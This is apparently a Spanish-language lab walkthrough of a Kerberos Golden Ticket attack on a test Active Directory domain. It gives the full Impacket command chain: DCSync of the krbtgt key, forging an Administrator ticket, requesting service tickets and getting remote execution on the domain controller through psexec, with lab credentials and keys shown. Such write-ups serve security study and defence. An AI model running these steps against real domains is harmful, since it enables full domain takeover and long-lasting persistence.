# ¿Qué es un Golden Ticket?
Un Golden Ticket es un Ticket Granting Ticket (TGT) de Kerberos falsificado, utilizado en entornos Windows Active Directory para obtener autenticación como cualquier usuario del dominio, incluso como una cuenta privilegiada.

La técnica se basa en comprometer la clave secreta de la cuenta krbtgt, utilizada por el controlador de dominio para firmar y validar los TGT de Kerberos. Con acceso a esta clave, un atacante puede generar tickets que el dominio considere legítimos.

A diferencia de comprometer una cuenta individual, obtener la clave de krbtgt representa un compromiso mucho más profundo del dominio, ya que permite la creación de identidades Kerberos arbitrarias y puede utilizarse como mecanismo de persistencia prolongada. 

Para realizar el ataque, se deben tener credenciales y accesos privilegiados dentro del dominio.

## 1. Cadena de Ataque (Flujo) 
```
Acceso Administrativo
        ↓
Domain Controller
        ↓
DCSync (secretsdump.py -just-dc-user krbtgt)
        ↓
Hash AES256 de krbtgt
        ↓
Forjar TGT (ticketer.py -aesKey)
        ↓
Administrator.ccache (TGT falsificado)
        ↓
Pedir TGS (getST.py -spn cifs)
        ↓
TGS válido
        ↓
Pass-The-Ticket (pseexec)
        ↓
Acceso al dominio
        ↓
Persistencia (válido hasta que se rote la credencial de krbtgt)

```

## 2. Reproducción

### 2.1 DCSync contra `krbtgt`

Como primer paso  ejecutamos ```DCSync``` contra la cuenta `krbtgt` del dominio. El objetivo es solicitar al controlador de dominio el material de autenticación asociado a esta cuenta y obtener su ```NT hash```.

Para la reproducción se utiliza `secretsdump.py` de Impacket con la opción `-just-dc-user`, limitando la extracción específicamente a `krbtgt`:

```bash
impacket-secretsdump raynex.lab/raynexuser-sa:'Raynex2026'@10.0.0.46 -just-dc-user krbtgt
```

### 2.2. Generación del Golden Ticket

Con la clave de `krbtgt` obtenida previamente, generamos un Golden Ticket para el usuario `Administrator` utilizando `impacket-ticketer`:

```bash
impacket-ticketer -aesKey da33e1c568c38a485ab7720458228f5b28f82f2f61dc831b80771989f26c9266 \
-domain-sid S-1-5-21-753357386-2939969038-3684773139 \
-domain raynex.lab \
Administrator
```

La herramienta genera el ticket y lo guarda como:

```text
Administrator.ccache
```

Este archivo será utilizado posteriormente para autenticarnos mediante Kerberos impersonando al usuario ```Administrator```.


### 2.3. Carga y validación del Golden Ticket

Cargamos el archivo `Administrator.ccache` como caché Kerberos:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
```

Validamos el ticket con `klist`:

```bash
klist -e
```

Resultado esperado:

```text
Ticket cache: FILE:/home/joseph/Desktop/Administrator.ccache
Default principal: Administrator@RAYNEX.LAB

Valid starting       Expires              Service principal
10/08/2026 01:39:07  10/05/2036 01:39:07  krbtgt/RAYNEX.LAB@RAYNEX.LAB
        renew until 10/05/2036 01:39:07, Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96
```

El ticket queda cargado en la caché Kerberos y listo para utilizarse en las siguientes operaciones.

### 2.4. Obtención del Service Ticket

Utilizamos el ticket Kerberos cargado previamente para solicitar un **Service Ticket (ST)** para el servicio `HOST` del Domain Controller:

```bash id="q8jv3r"
impacket-getST -k -no-pass \
    -spn host/RAYNEX-DC-01.raynex.lab \
    -dc-ip 10.0.0.46 \
    raynex.lab/Administrator
```

La herramienta obtiene el Service Ticket y lo guarda:

```text id="x9s2kk"
Administrator@host_RAYNEX-DC-01.raynex.lab@RAYNEX.LAB.ccache
```

Este ticket podrá utilizarse posteriormente para autenticarse contra el servicio correspondiente del Domain Controller.

### 2.5. Carga del Service Ticket

Cargamos el **Service Ticket (ST)** generado previamente en la caché Kerberos:

```bash
export KRB5CCNAME=$PWD/Administrator@host_RAYNEX-DC-01.raynex.lab@RAYNEX.LAB.ccache
```

Posteriormente, validamos la caché:

```bash
klist -e
```

El resultado confirma la presencia del ticket:

```text
Default principal: Administrator@RAYNEX.LAB

Service principal:
host/RAYNEX-DC-01.raynex.lab@RAYNEX.LAB
```
### 2.6. Acceso al Domain Controller

Obtenemos un **Service Ticket (ST)** para el servicio `CIFS`:

```bash
impacket-getST -k -no-pass \
    -spn cifs/RAYNEX-DC-01.raynex.lab \
    -dc-ip 10.0.0.46 \
    raynex.lab/Administrator
```

Cargamos el ticket generado:

```bash
export KRB5CCNAME=$PWD/Administrator@cifs_RAYNEX-DC-01.raynex.lab@RAYNEX.LAB.ccache
```

Validamos su presencia:

```bash
klist -e
```

Finalmente, utilizamos el ticket para autenticarnos mediante `psexec`:

```bash
impacket-psexec -k -no-pass \
    raynex.lab/Administrator@RAYNEX-DC-01.raynex.lab
```

La autenticación es exitosa y se obtiene ejecución remota con privilegios sobre el Domain Controller.


